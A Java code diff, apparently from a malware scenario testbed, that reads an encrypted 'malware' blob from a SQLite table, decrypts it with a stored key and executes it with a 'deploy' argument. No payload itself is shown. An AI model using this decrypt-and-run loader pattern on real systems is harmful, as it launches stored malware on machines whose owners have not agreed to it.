@@ -21,14 +21,20 @@ public class Library {
 		ScenarioHelper sch = new ScenarioHelper();
 		ScenarioBuilder scb = new ScenarioBuilder();
 		HashMap<Integer, Scenario> scenarios = scb.getScenarios();
+		String db = "filesDb.sqlite";
+		SqliteDatabase sqliteDB;
 
 		for (Integer key : scenarios.keySet()) {
-			System.out.println(scenarios.get(key).toString());
+			System.out.println("#####" + scenarios.get(key).toString());
 		}
 
-		SqliteDatabase sqliteDB = new SqliteDatabase("filesDb.sqlite");
-		sqliteDB.createMalwareTable();
-		sqliteDB.createScenariosTable();
+		if (!new File(SqliteDatabase.PATH + "\\" + db).exists()) {
+			sqliteDB = new SqliteDatabase(db);
+			sqliteDB.createDatabase();
+			sqliteDB.createTables();
+		} else {
+			sqliteDB = new SqliteDatabase(db);
+		}
 
 		String sql = "SELECT * FROM malware";
 
@@ -38,7 +44,7 @@ public class Library {
 
 			while (rs.next()) {
 				System.out.println("ID: " + rs.getInt("idNumber"));
-				if (rs.getInt("idNumber") == 2) {
+				if (rs.getInt("idNumber") == 9) {
 					File tempFile = sch.convertBytesToFile(rs.getBytes("dMalware"));
 					sqliteDB.getSecretKey().decryptFile(tempFile);
 					sch.executeFile(tempFile, "c++", "deploy");
